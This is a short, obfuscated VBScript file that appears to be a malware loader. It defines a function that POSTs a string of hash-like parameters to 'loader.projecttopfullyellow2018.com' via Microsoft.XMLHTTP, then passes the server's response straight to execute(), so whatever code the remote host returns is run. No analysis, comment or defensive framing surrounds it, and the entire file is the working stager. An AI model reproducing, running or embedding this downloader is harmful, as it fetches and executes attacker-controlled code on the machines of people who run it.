Function va4d925a67(sUrl, sRequest)
  set xaf44a1c444304 = CreateObject("Microsoft.XMLHTTP")
  xaf44a1c444304.open "POST", sUrl,false
  xaf44a1c444304.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
  xaf44a1c444304.setRequestHeader "Content-Length", Len(sRequest)
  xaf44a1c444304.send sRequest
  va4d925a67 = xaf44a1c444304.responseText
 End Function
aa8bc20ca4 = va4d925a67("http://loader.projecttopfullyellow2018.com/","c5d215777c229704a7862de577d40a73=d26e5e36c1b0b620407eadabb6c0c5c2&fb647ca6672b0930e9d00dc384d8b16f=aace49c7d80767cffec0e513ae886df0&244edd7e85dc81602b7615cd705545f5=182be0c5cdcd5072bb1864cdee4d3d6e&37f76c6fe3ab45e0cd7ecb176b5a046d=0c8ce55163055c4da50a81e0a273468c&196894366d827c56344bfe5186dbcf64=217b4c71837fac172fabebfc299f755b&84899ae725ba49884f4c85c086f1b340=e3d11d85deaf57a720d252cd069bcd37&c879ec4dfeaa4d0f14f8f395a09941c2=e2c4a40d50b47094f571e40efead3900&eab9c5e9815adc4c40a6557495eed6d3=01386bd6d8e091c2ab4c7c7de644d37b")
execute(aa8bc20ca4)